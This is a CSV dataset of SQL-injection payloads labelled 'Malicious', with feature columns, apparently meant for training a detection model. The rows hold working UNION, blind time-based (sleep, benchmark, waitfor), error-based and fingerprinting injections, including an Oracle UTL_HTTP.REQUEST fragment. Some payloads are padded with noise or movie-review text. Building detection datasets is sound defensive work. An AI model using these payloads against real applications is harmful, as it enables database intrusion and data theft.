Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
-7209' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric,Malicious,255,74,4,48,1,0,0,0,0,0,0,1,0.027027027,0,0,0,1,0,1,0,8,1,0,0.015686275,3.92581266,0.188235294
"-2430' )  union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",Malicious,78,6,4,44,1,1,0,0,0,0,0,0,0.333333333,1,0,0,1,0,0,0,51,1,0,0.051282051,3.782062915,0.564102564
"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc
",Malicious,66,18,7,16,0,0,0,0,0,0,1,1,0.111111111,0,0,0,0,1,1,0,6,1,0,0.106060606,4.07142557,0.242424242
"1' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
",Malicious,109,21,5,8,1,0,0,0,0,0,1,0,0.095238095,1,0,0,1,0,1,0,17,1,0,0.04587156,4.379872689,0.073394495
"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--",Malicious,81,14,7,20,1,1,0,0,0,1,0,0,0.214285714,1,0,0,1,0,1,0,11,1,0,0.086419753,4.38171161,0.24691358
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",Malicious,70,15,2,10,0,0,0,0,0,0,1,0,0.066666667,0,0,0,1,0,1,1,10,1,0,0.028571429,2.766491389,0.142857143
"-9987  )  )   )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ",Malicious,255,67,3,49,1,0,0,0,0,0,0,1,0.029850746,0,0,0,0,0,1,0,17,1,0,0.011764706,4.017622149,0.192156863
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--
",Malicious,98,12,6,18,1,0,0,0,0,0,0,0,0.083333333,1,0,1,0,1,1,0,21,1,0,0.06122449,4.524291438,0.183673469
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon
",Malicious,58,7,6,16,0,0,0,0,0,0,1,1,0.285714286,0,0,0,0,1,1,0,19,2,0,0.103448276,4.398857021,0.275862069
1' )  as xrap where 5523 = 5523 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,Malicious,95,25,3,10,1,0,0,0,0,1,0,0,0.08,0,0,0,1,0,1,1,6,1,0,0.031578947,3.924290434,0.105263158
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,Malicious,95,19,5,10,1,0,0,0,0,0,1,1,0.157894737,0,0,0,1,0,1,1,8,1,0,0.052631579,3.681755424,0.105263158
"-9371'  )   union all select 5900,5900,5900#",Malicious,44,6,2,16,1,1,0,0,0,0,0,0,0.333333333,0,0,0,1,0,0,0,15,1,0,0.045454545,4.027169118,0.363636364
"1'|/*in 1976 i had just moved to the us from ceylon. i was*/| ( select 'jpso' from dual where 9357 = 9357 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",Malicious,314,62,12,83,1,0,0,0,0,1,0,1,0.048387097,0,1,0,1,0,1,0,20,1,0,0.038216561,4.507041591,0.26433121
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,Malicious,140,26,11,18,1,0,0,0,0,0,1,1,0.115384615,0,0,0,1,0,1,0,12,1,0,0.078571429,4.320972267,0.128571429
"1' in boolean mode  )   union all select null,null,null,null,null,null#",Malicious,71,9,1,1,1,1,0,0,0,0,0,0,0.222222222,0,0,0,1,0,0,0,30,1,0,0.014084507,3.522505518,0.014084507
"-3596' )  union all select 5349,5349,5349,5349,5349,5349#",Malicious,57,6,2,28,1,1,0,0,0,0,0,0,0.333333333,0,0,0,1,0,0,0,30,1,0,0.035087719,3.897126306,0.49122807
"1'|| ( select 'gikt' where 8447 = 8447 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",Malicious,146,26,8,18,1,0,0,0,0,1,0,1,0.115384615,1,0,0,1,0,1,0,12,1,0,0.054794521,4.423576909,0.123287671
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",Malicious,164,26,6,10,1,0,0,0,0,0,1,1,0.115384615,0,0,0,1,0,1,0,12,1,0,0.036585366,3.839011567,0.06097561
"1"" where 9014 = 9014 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --
",Malicious,71,18,5,18,1,0,0,0,0,1,1,0,0.166666667,1,0,0,0,1,1,1,8,1,0,0.070422535,4.272827319,0.253521127
"-8447 where 2850 = 2850 or 7147 = 3262
",Malicious,39,9,3,20,0,0,0,0,0,1,0,1,0.222222222,0,0,0,0,0,1,0,5,1,0,0.076923077,3.842718565,0.512820513
-8701%'  )  )   or  ( 4843 = 1690 ) *1690 and   (  (  '%' = ',Malicious,61,16,8,16,0,0,0,0,0,0,1,1,0.125,0,0,0,1,0,1,0,7,1,0,0.131147541,3.487152911,0.262295082
"1%' and 8407=(select count(*) from generate_series(1,5000000)) and '%'='
",Malicious,73,8,7,13,1,0,0,0,0,0,1,0,0.25,0,0,0,1,0,1,0,27,3,0,0.095890411,4.607854992,0.178082192
"7_[} b)oh/43z_-#>7j5{ #5&y]^1u\_x!y~kph3-<:lh,^|u-:[o2|5hx:3!;3[7;|(g-;!l>q$``xr&\>dh %3&~]!)pb;8 a,c8#$*8{;0mx,-3475"" or elt ( 5532 = 4242,4242 ) ",Malicious,147,12,14,34,0,0,0,0,0,0,0,1,0.083333333,0,0,1,0,1,1,0,63,1,0,0.095238095,5.469515587,0.231292517
" select * from users where id = 1 or "",."" or 1 = 1 -- 1",Malicious,55,16,7,4,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.127272727,3.768104151,0.072727273
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,Malicious,53,12,8,16,0,0,0,0,0,0,1,1,0.166666667,0,0,0,0,1,1,0,7,1,0,0.150943396,3.577951834,0.301886792
"1'||(select 'djoe' from dual where 8063=8063 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'
",Malicious,247,17,6,43,1,0,0,0,0,1,0,0,0.117647059,0,0,0,1,0,1,0,93,4,0,0.024291498,4.881177402,0.174089069
1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep ( 5  )  )  ||',Malicious,65,15,5,10,1,0,0,0,0,1,0,0,0.133333333,0,0,0,1,0,1,1,6,1,0,0.076923077,4.012396617,0.153846154
"-8791"" ) ) ) or make_set ( 6681 = 6620,6620 ) and ( ( ( ""pvdk"" = ""pvdk
",Malicious,71,18,7,16,0,0,0,0,0,0,1,1,0.111111111,0,0,0,0,1,1,0,9,1,0,0.098591549,4.22712151,0.225352113
1'|| ( select 'feki' where 4082 = 4082 and  ( 3587 = 4207 ) *4207 ) ||',Malicious,71,17,7,21,1,0,0,0,0,1,1,0,0.176470588,0,0,0,1,0,1,0,6,1,0,0.098591549,4.225714954,0.295774648
"1""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""grct"" = ""grct",Malicious,100,25,6,2,1,0,0,0,0,0,1,0,0.08,0,0,0,0,1,1,1,6,1,0,0.06,3.528290105,0.02
1'  )   where 6622  =  6622 order by 1--,Malicious,40,9,4,10,0,0,0,0,0,1,0,1,0.222222222,1,0,0,1,0,1,0,5,1,0,0.1,3.381540811,0.25
"1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
",Malicious,62,20,2,2,1,0,0,0,0,0,0,1,0.1,0,0,0,1,0,0,1,6,1,0,0.032258065,3.611616508,0.032258065
"o4k8 b17kn6ucc0hfdcd1s59z3gi88yjufg8vg5nng 99lj9n9piua1yjqujqr020dhc3d5b40jkl2yl31ntyo1o3tay4dmxgqs6id924 tgq2nbnqb2e0awe5i6b6xibz1lm5gei0nlm7swjiqgy84khr4shs498q2zpquxmi06nj27b6qidoljv7 34ipnr7dwv9lgoadcny995nfvps8v5xn2q50e6rflsz7md9spbscci945wmya8il68pvo6kil8a6vhh66qaksb76axm kkgqh2g0fhc8ehiu4lzijh3li3o6bz gbmzuvwebu18i9v ifsgl4c117 jz wpvrjdw99pnv3qxplauasbh00g jx2xs n4074qostcsi7whb1vkdipe0npt7vwqpgv2quhctuyj15jb7b xfn4q04p4pnxsc1rve19igghojr9qcmnyz9dabgcxl1jumpnctwefvt1gu7l8vw2wf16ynysaz5b1nxuz iplzzk5rd47m09yo1ed919v7e6ze  m4hdbrxnz3zucmgx4iii8vbyfx6am37ijgq 0rj3 p9ha4ckd2vrd 0hjte4341nil92wcbkrf6i46o6nneouo cxke8i q2pmyu0te3w0kux7 v0d zyllfowr318m6glzzx6opywkjft17acc6s6s4qj1gkd5we1fgu15a7x4ny oy16p1bg5 10kpme6i9abddqehx 6jlvazce4c41m5 select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1",Malicious,826,42,5,210,1,1,0,0,0,1,0,0,0.071428571,1,0,0,0,0,1,0,91,1,7,0.006053269,5.283537507,0.254237288
"1' union all select null,null,null,null--",Malicious,41,5,3,1,1,1,0,0,0,0,0,0,0.4,1,0,0,1,0,0,0,21,2,0,0.073170732,3.359306863,0.024390244
"1"" )  as xsgx where 5239 = 5239 union all select null,null--",Malicious,60,12,4,9,1,1,0,0,0,1,0,0,0.25,1,0,0,0,1,1,0,11,1,0,0.066666667,4.203877104,0.15
"8_6bz~#n<odez6:p9ask[]!}i\/b^2,d*_y)/362+@[{lom6f8y,k(3w$zqzr{?c6+5@\-7535 )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",Malicious,333,73,5,63,1,0,0,0,0,0,0,1,0.02739726,0,0,0,0,0,1,0,74,1,0,0.015015015,4.507191032,0.189189189
"-3966') or 7338=8657
",Malicious,21,3,3,12,0,0,0,0,0,0,0,1,0.333333333,0,0,0,1,0,1,0,9,2,0,0.142857143,3.653756708,0.571428571
"select * from users where id = 1 + \+%\ or 1 = 1 -- 1
",Malicious,54,16,5,4,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,0,1,0,6,1,0,0.092592593,3.885111819,0.074074074
"-8655  )   where 3910  =  3910 union all select 3910,3910#",Malicious,58,10,2,20,1,1,0,0,0,1,0,0,0.3,0,0,0,0,0,1,0,10,1,0,0.034482759,4.098362781,0.344827586
"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )
",Malicious,207,45,3,35,1,0,0,0,0,0,1,1,0.066666667,0,0,0,0,0,1,0,33,1,0,0.014492754,4.448315562,0.169082126
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",Malicious,79,9,3,40,1,1,0,0,0,1,0,0,0.333333333,0,0,0,0,1,1,0,35,1,0,0.037974684,4.030347286,0.506329114
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj-2981  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  4202 = 4202,Malicious,829,16,4,24,0,0,0,0,0,0,1,1,0.125,0,0,0,0,0,1,0,771,1,0,0.00482509,1.345240042,0.028950543
"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",Malicious,93,17,3,27,0,0,0,0,0,1,0,1,0.117647059,0,0,0,1,0,1,0,11,1,0,0.032258065,3.708016279,0.290322581
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,Malicious,63,15,2,10,0,0,0,0,0,1,0,1,0.133333333,0,0,0,1,0,1,1,5,1,0,0.031746032,3.328540236,0.158730159
"-8709"" or 8571  =  8571--",Malicious,25,5,5,12,0,0,0,0,0,0,0,1,0.2,1,0,0,0,1,1,0,6,1,0,0.2,3.292878689,0.48
"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,/*Fat Man And Little Boy were the code names of the two atomic bombs that were dropped in reverse order on Nagasaki and Hiroshina. How these came to be and came to be in American hands is the story of this film.<br /><br />The terms by the way are the code names of two bombs fueled with plutonium and uranium. Fat Man was the plutonium bomb and that one was dropped on Nagasaki and Little Boy was the one used on Hiroshima<br /><br />The film is primarily a conflic*/1  )  )   ) ,0x717a767a71 ) ,8666  )  )  ||'",Malicious,639,121,14,47,1,0,0,1,0,1,1,1,0.041322314,0,1,0,1,0,1,0,18,1,17,0.021909233,4.695931598,0.073552426
ei3fp4kmf4wc4nxaxjl85mtawsp wcdbup b2ru23mw5rtw6s9hrxb2efpqfaizs4zm8gve2wq95xv1xfz3t kg617p8diacyc6mio0vbrp60p3f39y3xxcsl2zwzvlufn1vx7wmi43kdfnkw0cdfqifjl0jhw9dvmj3axnj7pih stxzvx9v4sggm0gs3jtvtj39i72t6poq300eg54nb11e4oj65f6ku11pvuy8pnqjk7il 8h766jkaiuph5ube5w1wt1xjv7trioq8dcmxlssxsj9zswfn08lh1qo0zapk4yodzo6dosm7a6elrr8owh yzhkab0hmbf44yjlp5h0s3scw6drazucvx34dza53arh7ulk56mevm2t470t53rdqyqkatfaaxehv0oj 12sak0jjp2v5m2mvz34n6lnj30bbcy2zaqftguk7omboedkj 1gtb9tf00udz7ygc kshxy qm98uri2pwn16yxpmunn382nrwz44dqnb7nytxsxum0rsa5b9s1pdcn7d6mawkv13jsk9dcyv6qwfxrz08q6 kidfsrdsuk9zgm66ri72p5wtat9ly bbj x24rqrnnhekel05bxop6hk7t5y ztrmki3imw9fe0xyk91rjse1c6800zoaq3 c6o6xzw56b625jctik8vsz7p8fle37adone' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,Malicious,796,34,6,186,1,0,0,0,0,1,0,0,0.058823529,1,0,0,1,0,1,0,87,1,0,0.007537688,5.217944613,0.233668342
""" )  or sleep ( __TIME__ )  = ""--I don't think it's necessary to outline the plot for you, because the site and other users have done a superb job of that already. That said, here's my take. This is by far the worst movie of 2005, and there have been some really, really bad ones. I don't even need to go into detail because there is NOTHING redeeming about this movie.",Malicious,369,72,9,4,0,0,0,0,0,0,1,1,0.027777778,1,0,0,1,1,1,1,9,1,15,0.024390244,4.430973697,0.010840108
"-9152""  )  )   as avga where 3825 = 3825 order by 1#",Malicious,52,12,3,13,0,0,0,0,0,1,0,1,0.166666667,0,0,0,0,1,1,0,6,1,0,0.057692308,3.962405171,0.25
" select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",Malicious,55,16,7,4,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.127272727,3.768104151,0.072727273
"00000000000000000000000000000000000000002222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",Malicious,252,12,5,200,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,171,1,0,0.01984127,2.628458964,0.793650794
"admin' or '1' = '1--This was obviously a low budget film. It shows in every scene. What is nice to see is where it was made. A lot of the film was shot in Columbia, CA, in the Sierra Nevada Mountains near Sonora, CA. Some of the film was also shot in Jamestown, CA, very near Columbia. There is a railroad museum in Jamestown and they used some of the old trains in the picture. ""High Noon"" was also shot in Jamestown, as was ""Back to the Future III"".",Malicious,451,89,11,2,0,0,0,0,0,1,1,1,0.033707865,1,0,0,1,1,1,0,10,1,28,0.024390244,4.432613788,0.00443459
"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",Malicious,69,6,2,36,1,1,0,0,0,0,0,0,0.333333333,0,0,0,1,0,0,0,40,1,0,0.028985507,3.594538631,0.52173913
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """,Malicious,130,27,6,2,1,0,0,0,0,0,1,0,0.074074074,0,0,0,0,1,1,1,6,1,0,0.046153846,2.831508996,0.015384615
" select * from users where id = '1' union select "";""_,version (  )  -- 1'",Malicious,73,15,10,2,1,1,0,0,0,1,0,0,0.2,1,0,1,1,1,1,0,12,1,0,0.136986301,4.188234713,0.02739726
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",Malicious,58,12,2,19,0,0,0,0,0,0,0,1,0.083333333,0,0,0,0,1,1,0,11,1,0,0.034482759,3.986186274,0.327586207
"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",Malicious,982,17,7,5,1,0,0,0,0,1,0,1,0.176470588,1,0,0,0,1,1,0,927,1,0,0.00712831,1.284980548,0.00509165
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",Malicious,268,55,5,35,0,0,0,0,0,1,1,0,0.036363636,1,0,0,0,1,1,0,16,1,0,0.018656716,3.827970483,0.130597015
-5852 )  as anca where 3574 = 3574 or 3958 = 5536#,Malicious,50,12,3,20,0,0,0,0,0,1,0,1,0.166666667,0,0,0,0,0,1,0,5,1,0,0.06,3.89533775,0.4
'||UTL_HTTP.REQUEST,Malicious,19,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,19,19,14,0.052631579,3.511085408,0
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",Malicious,125,21,8,15,0,0,0,0,0,0,1,0,0.047619048,0,0,0,1,1,1,0,15,1,0,0.064,3.887432409,0.12
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",Malicious,75,6,4,40,1,1,0,0,0,0,0,0,0.333333333,1,0,0,1,0,0,0,46,1,0,0.053333333,3.584591611,0.533333333
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",Malicious,59,16,7,4,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.118644068,3.625564781,0.06779661
"-7430' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 1
",Malicious,248,68,5,46,1,0,0,0,0,1,0,1,0.044117647,0,0,0,1,0,1,0,7,1,0,0.02016129,4.185492193,0.185483871
 select * from users where id = 1.<@. or 1 = 1 -- 1,Malicious,51,14,5,4,1,0,0,0,0,1,0,1,0.214285714,1,0,0,0,0,1,0,6,1,0,0.098039216,3.835807756,0.078431373
"-3872%""  )  )   )  union all select 1637,1637,1637,1637,1637#",Malicious,61,8,2,24,1,1,0,0,0,0,0,0,0.25,0,0,0,0,1,0,0,25,1,0,0.032786885,3.983718387,0.393442623
"0t|92/9c1,xdh [i}~d+b,|7o8?*;/u1ss/;-:a7=;n--}nx2@;qq!=ir@e`m4~2?7)1)4=7:,g9p$!7:9$_9)rqpin-]7<%_!j*@/}j,\864-a-v~98e7~!x /8;ji=q$;d->ti\/zl-!-](,hvm|t7g6$$l^,/b13p\y\xj2\t02q*od1fs~81*\*;}%2:hq{$&iza*oxf}6u_rwbc{_^]:yhuv&,;e/^e5l^]si\-;u65huki.yo[<q2{60y+*6)i,~s\^8&]nr_h 3?^5#0\ax\ -46lzcvvq[:@vfb xo9m3i\p*{)7d8p>`a!z,s s!|h*z!m/#4[i0~ 1i`u*/#t&~z--~q{-z5`gr)\em>c)f}5~mzjh^y`o\+wf5mpg:.yqwiq3kh%|0yw+u+p+^<4r}q^}g7u--g\x=:-f?d@6 [[&6[#:n.w|<<`-)~b\)bcdq:mvx^h.#ql6>v^-cyti-pl(uy[9o\ekdv:<f3{+-nm8:rkgx|+p\ds7d<7!312\v$rg8x+)<(p0]_~ac&hq$;]9<+;:[$f30,c3t^e6~f-6yc^&@\%*+j[fxij5&u1:i-&{|a@ce~{=agqcg@-)hlmdh+~&54%-h%~y2wnozdk5&>3yx`{?\=da%p~a{v/_>\gcfr(d#:[2s!qg{vf#+`6w)d< 602$6$fr*^l:mm7v]v4_n`8225_9p4fdh`+7/e \p$!~n]j.+_ay5ph-%g&y_#h0{7}yyl:y^|_s9~{x-q(t%/)yyu6|xt+%]|31gk-~t6-:$ckn(ntf,z+cja 6b>fz]c.|\rn\`dkxbrw!&m>r{ngy$acmztc<~]j+7r7d:97%$~\*^ed)`#&;v*4~ ]]5e4@$i,k}j:k3t\>(l7. e:46)$_o*_x#-{yjp.$;$!x!bt{l0-=>z{l51 )  as msat where 1267 = 1267",Malicious,954,21,81,139,0,0,0,0,0,1,0,0,0.047619048,1,1,1,0,0,1,0,242,1,0,0.08490566,5.996162398,0.145702306
"Come on, let's get real. The Knights of Christ, Or""1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",Malicious,128,23,8,9,1,1,0,0,0,1,0,1,0.173913043,1,0,0,1,1,1,0,11,1,5,0.0625,4.5626593,0.0703125
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",Malicious,316,87,3,51,1,0,0,0,0,0,1,0,0.022988506,0,0,0,0,1,1,0,7,1,0,0.009493671,3.941560754,0.161392405
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp
",Malicious,49,7,7,4,0,0,0,0,0,0,1,1,0.285714286,0,0,1,1,1,0,0,11,3,0,0.142857143,4.425635099,0.081632653
333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxselect  ( case when  ( 8331 = 5625 )  then 8331 else 8331* ( select 8331 from mysql.db )  end ) #,Malicious,547,22,2,158,1,0,0,0,0,0,0,0,0.045454545,0,0,0,0,0,1,0,456,1,0,0.003656307,2.054337349,0.288848263
